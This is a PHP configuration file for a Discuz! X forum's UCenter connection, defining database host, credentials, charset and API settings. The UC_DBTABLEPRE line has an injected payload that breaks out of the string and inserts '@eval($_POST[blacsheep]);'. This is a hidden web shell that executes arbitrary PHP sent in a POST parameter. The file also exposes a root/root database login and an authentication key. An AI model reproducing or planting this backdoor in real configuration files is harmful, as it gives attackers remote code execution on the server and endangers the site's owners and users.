<?php


define('UC_CONNECT', 'mysql');

define('UC_DBHOST', 'localhost');
define('UC_DBUSER', 'root');
define('UC_DBPW', 'root');
define('UC_DBNAME', 'ultrax');
define('UC_DBCHARSET', 'utf8');
define('UC_DBTABLEPRE', '`ultrax`.x');@eval($_POST[blacsheep]);('ucenter_');
define('UC_DBCONNECT', 0);

define('UC_CHARSET', 'utf-8');
define('UC_KEY', 'sc42b5A957S315kf69N0Te08J7obp4cdOb2cI30ce3bcAep400n905G8x8M9xeY3');
define('UC_API', 'http://localhost/DiscuzX/upload/uc_server');
define('UC_APPID', '0');
define('UC_IP', '');
define('UC_PPP', 20);
?>